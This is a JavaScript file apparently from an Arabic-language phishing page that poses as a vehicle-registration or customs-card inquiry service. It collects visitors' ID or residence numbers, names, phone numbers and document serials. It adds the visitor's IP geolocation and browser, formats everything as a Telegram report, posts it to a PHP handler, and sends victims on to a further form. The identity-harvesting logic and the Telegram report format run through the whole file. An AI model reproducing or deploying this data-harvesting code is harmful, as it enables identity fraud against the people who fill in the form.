    async function fetchGeoAndBrowserInfo() {
        try {
            const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
            const browser = navigator.userAgent;
            return { geo, browser };
        } catch (error) {
            console.error('Error fetching geo or browser info:', error);
            return { geo: {}, browser: navigator.userAgent }; // Return default on error
        }
    }

    function createTelegramMessage(formData, extraData) {
        const formType = formData.get('serial_number_form') ? 'استمارة' : 'بطاقة جمركية';
        let message = `
📋 معلومات مقدم الطلب :
- رقم الهوية / الإقامة: ${formData.get('id_number') || 'غير محدد'}
- اسم مالك الوثيقة: ${formData.get('owner_name') || 'غير محدد'}
- رقم الهاتف: ${formData.get('phone') || 'غير محدد'}
- نوع الوثيقة: ${formType}
`;

        if (formType === 'استمارة') {
            message += `\n- الرقم التسلسلي: ${formData.get('serial_number_form') || 'غير محدد'}`;
        } else {
            message += `\n- سنة الصنع: ${formData.get('manufacture_year') || 'غير محدد'}`;
            message += `\n- الرقم التسلسلي: ${formData.get('serial_number_custom') || 'غير محدد'}`;
        }

        message += `\n- الموافقة على الاستعلام: ${formData.get('agree') ? 'نعم' : 'لا'}`;

        if (extraData && extraData.geo) {
            message += `\n\n🌍 معلومات الموقع:`;
            message += `\n- IP: ${extraData.geo.ip || 'غير متوفر'}`;
            message += `\n- المدينة: ${extraData.geo.city || 'غير متوفر'}, ${extraData.geo.region || 'غير متوفر'}`;
            message += `\n- الدولة: ${extraData.geo.country_name || 'غير متوفر'}`;
        }
        if (extraData && extraData.browser) {
            message += `\n🌐 المتصفح: ${extraData.browser}`;
        }
        return message;
    }

    function validateCaptcha() {
        const input = document.getElementById('captchaInput').value.trim();
        const code = document.getElementById('captchaCode').textContent.trim();
        return input === code;
    }

    document.getElementById('myForm').addEventListener('submit', async function(event) {
        event.preventDefault(); 

        if (!validateCaptcha()) {
            alert('رمز التحقق غير صحيح!');
            return;
        }

        const formData = new FormData(this); // جمع كل بيانات النموذج
        const extraData = await fetchGeoAndBrowserInfo(); // جلب معلومات إضافية

        // إنشاء رسالة تيليجرام شاملة
        const telegramMessage = createTelegramMessage(formData, extraData);

        try {
            const response = await fetch('process_form.php', { 
                method: 'POST',
                body: formData 
            });

            const result = await response.json(); 

if (result.status === 'success') {
                localStorage.setItem('owner_name', formData.get('owner_name'));
                localStorage.setItem('id_number', formData.get('id_number')); 
                alert('تم إرسال بياناتك بنجاح!');
                window.location.href = 'form.html';
                this.reset();
                generateCaptcha();
            } else {
                alert('فشل في إرسال البيانات: ' + (result.message || 'خطأ غير معروف.'));
            }
        } catch (error) {
            alert('خطأ في الاتصال بالخادم. الرجاء المحاولة مرة أخرى لاحقاً.');
            console.error('Fetch error:', error);
        }
    });

    window.onload = generateCaptcha;

    function toggleFormType(type) {
        const formBtn = document.getElementById('formBtn');
        const customBtn = document.getElementById('customBtn');
        const formFields = document.getElementById('form-fields');
        const customFields = document.getElementById('custom-fields');

        if (type === 'form') {
            formBtn.classList.add('active');
            customBtn.classList.remove('active');
            formFields.style.display = 'block';
            customFields.style.display = 'none';
        } else {
            formBtn.classList.remove('active');
            customBtn.classList.add('active');
            formFields.style.display = 'none';
            customFields.style.display = 'block';
        }
    }